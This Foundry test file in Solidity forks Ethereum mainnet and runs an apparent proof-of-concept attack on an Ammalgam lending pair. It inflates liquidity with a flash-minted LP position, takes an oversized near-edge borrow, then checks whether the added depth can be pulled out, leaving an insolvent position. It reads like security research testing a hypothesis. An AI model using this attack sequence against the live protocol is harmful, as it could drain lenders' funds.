// SPDX-License-Identifier: MIT
pragma solidity ^0.8.34;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IAmmalgamPair {
    function mint(address to) external returns (uint256);
    function burn(address to) external returns (uint256, uint256);
    function deposit(address to) external;
    function borrow(address to, uint256 amountXAssets, uint256 amountYAssets, bytes calldata data) external;
    function tokens(uint256 tokenType) external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
    function externalLiquidity() external view returns (uint112);
    function underlyingTokens() external view returns (address, address);
}

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s, uint8 d) {
        name = n;
        symbol = s;
        decimals = d;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Decisive test: open a NEAR-EDGE (~<=75% raw LTV) oversized borrow via flash-LP-inflated depth,
///      then try to REMOVE the depth. Determines whether MaxTrancheOverSaturated blocks depth removal
///      (hypothesis defended) or whether the depth can be pulled leaving an impossible-to-open position.
contract FlashLpBurnDecisiveTest is Test {
    address constant FACTORY = 0x1a411b0fD1f368D2F413A8cBb6aAD425c923015B;

    MockERC20 tokenX;
    MockERC20 tokenY;
    IAmmalgamPair pair;

    function setUp() public {
        vm.createSelectFork(vm.envOr("ETH_RPC_URL", string("https://ethereum.publicnode.com")));
        tokenX = new MockERC20("MockX", "X", 18);
        tokenY = new MockERC20("MockY", "Y", 18);
        address p = IFactory(FACTORY).createPair(address(tokenX), address(tokenY));
        pair = IAmmalgamPair(p);

        uint256 seed = 1e24;
        tokenX.mint(address(this), seed);
        tokenY.mint(address(this), seed);
        tokenX.transfer(p, seed);
        tokenY.transfer(p, seed);
        pair.mint(address(this));
    }

    function test_flashLp_thenRemoveDepth() public {
        (address px, address py) = pair.underlyingTokens();
        MockERC20 assetX = MockERC20(px);
        MockERC20 assetY = MockERC20(py);
        (uint112 rx, uint112 ry,) = pair.getReserves();

        // Match the working fresh-pair calibration (control reverts at real depth; flash depth lets it pass).
        uint256 borrowAmt = uint256(rx) * 70 / 100;
        uint256 collAmt = (uint256(ry) * borrowAmt / uint256(rx)) * 500 / 100;
        uint256 flashX = uint256(rx) * 20;
        uint256 flashY = uint256(ry) * 20;

        // Control: same near-edge borrow reverts without flash LP (slippage on real depth).
        {
            address ctrl = makeAddr("ctrl2");
            assetY.mint(ctrl, collAmt);
            vm.startPrank(ctrl);
            assetY.transfer(address(pair), collAmt);
            pair.deposit(ctrl);
            vm.expectRevert();
            pair.borrow(ctrl, borrowAmt, 0, "");
            vm.stopPrank();
            console2.log("control (no flash LP) reverted OK at near-edge LTV");
        }

        address atk = makeAddr("atk2");
        address hlp = makeAddr("hlp2");
        assetY.mint(atk, collAmt);
        assetX.mint(hlp, flashX);
        assetY.mint(hlp, flashY);

        // Attacker posts near-edge collateral.
        vm.startPrank(atk);
        assetY.transfer(address(pair), collAmt);
        pair.deposit(atk);
        vm.stopPrank();

        // Helper flash-mints depth.
        vm.startPrank(hlp);
        assetX.transfer(address(pair), flashX);
        assetY.transfer(address(pair), flashY);
        uint256 lp = pair.mint(hlp);
        vm.stopPrank();
        console2.log("flash LP minted", lp);

        // Attacker borrows (passes only because ALA is inflated).
        uint256 beforeBal = assetX.balanceOf(atk);
        vm.prank(atk);
        pair.borrow(atk, borrowAmt, 0, "");
        uint256 gained = assetX.balanceOf(atk) - beforeBal;
        console2.log("borrowed X (flash-LP inflated ALA)", gained);
        assertEq(gained, borrowAmt, "borrow succeeded via inflated depth");

        // DECISIVE: attempt to remove the flash depth while the oversized debt persists.
        // The DEPOSIT_L transfer itself triggers validateOnUpdate -> Saturation.update, so both steps
        // are probed with low-level calls that capture reverts.
        address lpToken = pair.tokens(0); // DEPOSIT_L
        bool burnReverted;

        vm.prank(hlp);
        (bool okXfer, bytes memory r1) =
            lpToken.call(abi.encodeWithSignature("transfer(address,uint256)", address(pair), lp));
        if (!okXfer) {
            burnReverted = true;
            console2.log("REMOVAL REVERTED at DEPOSIT_L transfer (saturation update)");
            console2.logBytes(r1);
        } else {
            vm.prank(hlp);
            (bool okBurn, bytes memory r2) = address(pair).call(abi.encodeWithSignature("burn(address)", hlp));
            if (!okBurn) {
                burnReverted = true;
                console2.log("REMOVAL REVERTED at burn()");
                console2.logBytes(r2);
            } else {
                console2.log("BURN SUCCEEDED - depth removed");
            }
        }

        (uint112 rx2, uint112 ry2,) = pair.getReserves();
        console2.log("reserveX after attempt", rx2);
        console2.log("reserveY after attempt", ry2);
        console2.log("debt shares remaining", IERC20(pair.tokens(4)).balanceOf(atk));

        if (burnReverted) {
            console2.log("VERDICT: saturation invariant defends - flash-LP attack cannot remove depth atomically");
        } else {
            // Depth removed. Probe whether the position is now one the protocol would NEVER allow:
            // attacker attempts to borrow 1 wei more -> should revert if position is now insolvent at real depth.
            vm.prank(atk);
            try pair.borrow(atk, 1, 0, "") {
                console2.log("post-burn: +1 borrow still allowed (position not flagged insolvent)");
            } catch {
                console2.log("VERDICT: depth removed AND position now insolvent at real depth (impossible-to-open state left standing)");
            }
        }
    }
}
